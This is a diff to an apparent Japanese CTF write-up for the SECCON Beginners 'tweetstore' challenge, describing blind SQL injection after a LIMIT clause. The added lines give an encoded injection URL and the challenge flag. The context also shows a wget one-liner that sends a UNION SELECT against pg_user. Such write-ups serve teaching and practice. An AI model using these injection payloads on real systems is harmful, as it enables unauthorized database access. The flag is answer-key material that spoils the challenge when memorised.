@@ -37,6 +37,8 @@
     limit句以降にあるSQLiでascii(substr((select user), 1, 1));-- のような形で表示件数を絞り，その件数から1文字ずつフラグを特定できる
 
     Answer(想定解)
+        URLexample: http://tweetstore.quals.beginners.seccon.jp/?search=&limit=1+offset+ascii%28substr%28%28current_user%29%2C200%2C1%29%29
+        Answer: ctf4b{is_postgres_your_friend?}
     Answer(想定外の解答)
         echo -e "%\\' union select usename as url, usename as text, NOW() as tweeted_at from pg_user--" | nkf -WwMQ |sed -e "s/=\$//" | tr -d "\n" | tr = % | xargs -I{} wget -v -O - https://tweetstore.quals.beginners.seccon.jp/?search={}\&limit=10
 
